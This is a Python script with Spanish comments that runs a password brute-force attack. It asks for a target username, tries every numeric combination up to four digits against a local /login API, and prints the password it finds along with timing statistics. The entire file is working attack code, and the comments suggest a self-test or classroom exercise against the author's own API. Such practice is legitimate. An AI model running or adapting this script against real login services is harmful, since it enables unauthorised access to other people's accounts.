import requests
import time
import itertools

# Configuración
BASE_URL = "http://127.0.0.1:8000"  # URL de tu API
CHARSET = "0123456789"              # Pequeño para pruebas rápidas
MAX_LENGTH = 4                      # Longitudes secuenciales: 1 a 4
SUCCESS_MESSAGE = "Aleluya"         # Mensaje de éxito en tu API

# Input simple para usuario objetivo
TARGET_USER = input("Ingresa el usuario objetivo: ").strip()

print("=== ATAQUE DE FUERZA BRUTA CLÁSICA (VERSIÓN SIMPLE) ===")
print("Objetivo: Usuario '" + TARGET_USER + "'")
print("Charset: " + CHARSET + " (tamaño: " + str(len(CHARSET)) + ")")
print("Espacio total estimado (hasta " + str(MAX_LENGTH) + " chars): ~" + str(sum(len(CHARSET)**i for i in range(1, MAX_LENGTH+1))) + " combinaciones")
print("API: " + BASE_URL + "/login")
print("----------------------------------------")

start_time = time.time()
attempts = 0
found = False

# Bucle para longitudes secuenciales (automático)
for length in range(1, MAX_LENGTH + 1):
    if found:
        break
    
    print("\n--- Probando longitud " + str(length) + " (" + str(len(CHARSET)**length) + " combinaciones posibles) ---")
    
    # Generar todas las combinaciones de esta longitud
    for combo in itertools.product(CHARSET, repeat=length):
        password = ''.join(combo)
        attempts += 1
        
        # Enviar POST
        payload = {"username": TARGET_USER, "password": password}
        try:
            response = requests.post(BASE_URL + "/login", json=payload, timeout=5)
            response_text = response.json().get("message", "")
        except requests.RequestException:
            continue  # Salta errores de red
        
        # Verificar éxito
        if SUCCESS_MESSAGE in response_text:
            end_time = time.time()
            total_time = end_time - start_time
            print("\n[+] ¡ÉXITO! Contraseña encontrada: '" + password + "' (longitud " + str(length) + ")")
            print("[+] Intentos totales: " + str(attempts))
            print("[+] Tiempo total: " + str(round(total_time, 2)) + " segundos")
            print("[+] Tasa promedio: " + str(round(attempts / total_time, 2)) + " intentos/segundo")
            found = True
            break
        
        # Pausa para no sobrecargar
        time.sleep(0.05)
    
    if not found:
        print("[!] Longitud " + str(length) + " agotada sin éxito")

# Resultado final
if not found:
    total_time = time.time() - start_time
    print("\n[!] Ataque finalizado sin éxito (agotó " + str(attempts) + " combinaciones).")
    print("[!] Intentos totales: " + str(attempts))
    print("[!] Tiempo total: " + str(round(total_time, 2)) + " segundos")
    print("[!] Tasa: " + str(round(attempts / total_time, 2)) + " intentos/segundo")

print("=== FIN DEL ATAQUE ===")